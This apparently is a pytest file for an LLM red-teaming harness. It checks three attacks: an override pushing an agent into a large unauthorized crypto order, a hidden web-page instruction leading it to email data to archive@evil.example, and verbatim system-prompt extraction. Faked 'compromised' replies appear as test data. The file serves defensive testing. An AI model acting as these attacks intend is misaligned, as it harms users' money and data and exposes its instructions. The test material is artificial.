import pkgutil

import redteam.attacks as attacks_pkg
from redteam.attack import CLASSES
from redteam.attacks import direct_override_order as dro
from redteam.attacks import extract_rules_verbatim as erv
from redteam.attacks import load_all
from redteam.attacks import page_hidden_email as phe
from redteam.configs import CONFIGS
from redteam.runner import run_one

from .fakes import FakeClient, text_reply, tool_reply


def test_every_attack_is_well_formed():
    attacks = load_all()
    assert len(attacks) >= 3
    ids = [a.id for a in attacks]
    assert len(ids) == len(set(ids)), "duplicate attack ids"
    for a in attacks:
        assert a.cls in CLASSES, a.id
        assert a.turns and all(t.strip() for t in a.turns), a.id
        assert callable(a.check), a.id


def test_attack_id_matches_its_filename():
    files = {m.name for m in pkgutil.iter_modules(attacks_pkg.__path__)}
    assert {a.id for a in load_all()} == files


# Replay a "model fell for it" and a "model behaved" script through the real runner
# for each attack, so a check that never fires (or always fires) shows up here.
BASE = CONFIGS["baseline"]


def _run(attack, replies, tmp_path):
    return run_one(attack, BASE, FakeClient(replies), cache_dir=tmp_path)


def test_direct_override_fires_on_big_order_only(tmp_path):
    big = tool_reply("place_order", {"symbol": "BTC", "side": "buy", "amount_usd": 5000})
    assert _run(dro.ATTACK, [big, text_reply("done")], tmp_path).success
    assert not _run(dro.ATTACK, [text_reply("I can't lift the limit.")], tmp_path / "b").success


def test_hidden_email_fires_on_email_to_stranger_only(tmp_path):
    fetch = tool_reply("fetch_url", {"url": phe.URL})
    mail = tool_reply("send_email", {"to": "archive@evil.example", "subject": "digest", "body": "x"}, "toolu_2")
    assert _run(phe.ATTACK, [fetch, mail, text_reply("summary")], tmp_path).success
    assert not _run(phe.ATTACK, [fetch, text_reply("summary")], tmp_path / "b").success


def test_extraction_fires_on_dump_only(tmp_path):
    dump = text_reply("```\n" + BASE.system + "\n```")
    assert _run(erv.ATTACK, [dump], tmp_path).success
    assert not _run(erv.ATTACK, [text_reply("Sorry, I can't share that.")], tmp_path / "b").success
